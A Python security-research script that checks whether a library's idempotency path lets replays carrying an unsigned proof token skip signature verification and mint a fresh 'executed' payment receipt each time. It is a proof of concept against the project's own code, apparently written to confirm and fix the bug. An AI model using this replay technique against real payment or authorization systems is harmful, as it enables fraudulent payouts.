#!/usr/bin/env python3
"""
Follow-up investigation: does replaying the SAME operation_id with an
UNSIGNED PCCB, many times, mint a FRESH, uniquely-IDed 'executed' Receipt
each time? If a downstream ledger credits money per distinct receipt_id
(the natural way to consume a receipt stream), this is unbounded free
money for the attacker, not just a one-time harmless replay.
"""
import sys
from pathlib import Path

# This script lives at <repo>/security-research/investigate_unbounded_receipts.py,
# so its repo root is two levels up. Resolve it dynamically instead of a
# hardcoded machine-specific path, so it works from any checkout.
_REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO_ROOT))
sys.path.insert(0, str(_REPO_ROOT / "tests"))

import tempfile
from dataclasses import replace

from actenon.execution.protected_executor import ProtectedExecutor
from actenon.idempotency import IdempotencyStore
from actenon.models.runtime import ProtectedExecutionRequest
from actenon.proof import PCCBVerifier, VerifierDisclosureMode
from actenon.replay import ReplayProtector, SqliteReplayStore

from tests.security.helpers import (
    build_security_context,
    build_security_intent,
    mint_security_pccb,
    security_signer,
    unsigned_pccb_with_action_hash,
)


class _Broker:
    from actenon.credentials import BrokeredCredential
    from datetime import timedelta

    def acquire(self, intent, pccb, context):
        return self.BrokeredCredential(
            credential_id="cred_test",
            issued_at=context.now,
            expires_at=context.now + self.timedelta(minutes=5),
            scope=("test",),
        )

    def release(self, credential, result):
        pass


def main() -> int:
    with tempfile.TemporaryDirectory() as tempdir:
        replay_db = tempfile.mktemp(suffix=".sqlite3", dir=tempdir)

        # The idempotency branch in ProtectedExecutor.execute() deliberately
        # skips `handler` and copies the ORIGINAL recorded payload into every
        # replay's receipt — that's how idempotency is supposed to work, and
        # it's true whether or not the replay carries a valid signature. So
        # checking the payload content proves nothing: it's identical by
        # construction on every replay, real bug or not. The only evidence
        # that actually distinguishes "the bug lets an unsigned replay
        # through" from "idempotency is working as designed on a REAL proof"
        # is whether proof_verifier.verify() was ever invoked for the forged
        # replays. Wrap the verifier the same way investigate_idempotency_
        # order.py does, and count calls.
        verify_calls = {"count": 0}
        real_verifier = PCCBVerifier(security_signer(), disclosure_mode=VerifierDisclosureMode.LOCAL_DEBUG)

        class CountingVerifier:
            def verify(self, intent, pccb, context):
                verify_calls["count"] += 1
                return real_verifier.verify(intent, pccb, context)

        executor = ProtectedExecutor(
            proof_verifier=CountingVerifier(),
            credential_broker=_Broker(),
            replay_protector=ReplayProtector(SqliteReplayStore(replay_db)),
            idempotency_store=IdempotencyStore(),
        )

        operation_id = "op_unbounded_demo"
        amount = 1000
        intent1 = replace(build_security_intent(amount_minor=amount), metadata={"operation_id": operation_id})
        context1 = build_security_context()
        pccb1 = mint_security_pccb(intent=intent1, context=context1)
        request1 = ProtectedExecutionRequest(intent=intent1, pccb=pccb1, context=context1)

        def handler(req, cred):
            return {"result": "money_moved", "amount_minor": amount}

        result1 = executor.execute(request1, handler)
        print(f"Legit execution #0: receipt_id={result1.receipt.receipt_id}, outcome={result1.receipt.outcome}, "
              f"verify() calls so far: {verify_calls['count']}")
        assert result1.refusal is None, "expected the first legitimate execution to succeed"
        assert verify_calls["count"] == 1, "expected exactly one verify() call for the legitimate execution"

        forged_pccb = unsigned_pccb_with_action_hash(intent1, context1)
        receipt_ids: set[str] = set()
        N = 10
        print(f"\nReplaying with an UNSIGNED PCCB {N} times (same operation_id, no valid signature)...")
        for i in range(1, N + 1):
            request_i = ProtectedExecutionRequest(intent=intent1, pccb=forged_pccb, context=context1)
            calls_before = verify_calls["count"]
            result_i = executor.execute(request_i, handler)
            verified_this_replay = verify_calls["count"] > calls_before
            no_refusal = result_i.refusal is None
            rid = result_i.receipt.receipt_id if (no_refusal and result_i.receipt) else None
            print(f"  replay #{i}: refusal={result_i.refusal}, verify()_called={verified_this_replay}, "
                  f"receipt_id={rid}")
            # Only count this as the confirmed bug if BOTH: no signature was
            # ever checked, AND a receipt was minted anyway. A downstream
            # patch that keeps returning a receipt but starts calling
            # verify() again would correctly fail this check.
            if no_refusal and not verified_this_replay and rid is not None:
                receipt_ids.add(rid)

        print(f"\nDistinct receipt_ids minted across {N} forged replays with NO verify() call: {len(receipt_ids)}")
        print(f"Total proof_verifier.verify() calls across the whole run: {verify_calls['count']} (expected 1 if the bug holds)")
        if len(receipt_ids) == N and verify_calls["count"] == 1:
            print(f"[CONFIRMED] Every single forged replay minted a BRAND-NEW, uniquely-numbered")
            print(f"'executed' receipt for {amount} minor units, and proof_verifier.verify() was")
            print(f"NEVER called again after the very first legitimate execution. A downstream")
            print(f"ledger that credits money per distinct receipt_id (the normal way to consume")
            print(f"a receipt stream) would pay out {N} x {amount} = {N * amount} minor units for")
            print(f"ONE real, signature-checked authorization. This scales with however many")
            print(f"requests the attacker is willing to send: UNBOUNDED.")
            return 0
        print(f"\n[NOT CONFIRMED] Either a replay was refused, verify() was called again, or "
              f"something else changed — the idempotency-skip bug does not appear to hold here.")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
